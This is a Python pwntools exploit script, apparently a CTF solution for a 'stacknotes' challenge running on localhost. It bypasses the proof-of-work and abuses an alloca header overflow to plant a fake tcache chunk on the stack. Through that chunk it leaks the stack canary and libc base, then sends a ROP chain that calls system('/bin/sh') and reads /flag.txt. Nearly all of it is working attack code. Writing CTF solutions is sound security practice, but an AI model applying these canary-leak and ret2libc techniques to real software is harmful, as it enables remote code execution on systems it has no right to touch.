#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF("/home/user/stacknotes")
libc = ELF("/home/user/libc-2.31.so")

#conn = elf.process()
conn = remote("localhost", 1337)

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

print(conn.recvuntil('== proof-of-work: '))
if conn.recvline().startswith(b'enabled'):
    handle_pow(conn)

# helper functions
def create(idx, size):
  conn.recvuntil("> ")
  conn.sendline("c")
  conn.recvlines(2)
  conn.sendline(str(idx))
  conn.recvline()
  conn.sendline(str(size))

def write(idx, content):
  conn.recvuntil("> ")
  conn.sendline("w")
  conn.recvline()
  conn.sendline(str(idx))
  conn.recvline()
  conn.send(content)

def view(idx):
  conn.recvuntil("> ")
  conn.sendline("v")
  conn.recvline()
  conn.sendline(str(idx))
  conn.recvline()
  return conn.recvline()

def delete(idx):
  conn.recvuntil("> ")
  conn.sendline("d")
  conn.recvline()
  conn.sendline(str(idx))

def ret():
  conn.recvuntil("> ")
  conn.sendline("e")

create(15, 0x400) # warm up the heap

create(0, 31) # fake chunk, allocated on stack
create(1, 31) # headers for our fake chunk, this will get allocated by alloca() below our first chunk
              # size will actually get rounded down to 24, we have a 7 byte overflow into the alloca header

write(1, b"a"*24 + p64(0x311)[:-1]) # size is 0x310, with 1 for prev_inuse. The last byte is already 0
                                    # because it was a pointer

delete(0) # free the fake chunk into the tcache

create(2, 0x300) # get our stack chunk back, program believes it has size 0x300

leaks = view(2) # write() prints past null bytes, so we get all our leaks
parsed_leaks = [u64(l) for l in [leaks[n:n+8] for n in range(0, len(leaks), 8)][:-1]]

#print([hex(n) for n in parsed_leaks])

canary = parsed_leaks[5]
libc.address = parsed_leaks[7] - 0x270b3 # leaked libc through return address

log.info("canary: " + hex(canary))
log.info("libc @ " + hex(libc.address))

rop = ROP(libc)

# system("/bin/sh")
payload = b"a"*40
payload += p64(canary)
payload += p64(0)
payload += p64(rop.find_gadget(["ret"])[0]) # stack alignment
payload += p64(rop.find_gadget(["pop rdi", "ret"])[0])
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.symbols["system"])

write(2, payload) # write our ropchain
ret() # start the ropchain

#gdb.attach(conn)

conn.sendline("cat /flag.txt")
flag = conn.recvline()
if b"idek" in flag:
  print(flag)
  exit(0)
exit(1)

conn.interactive()
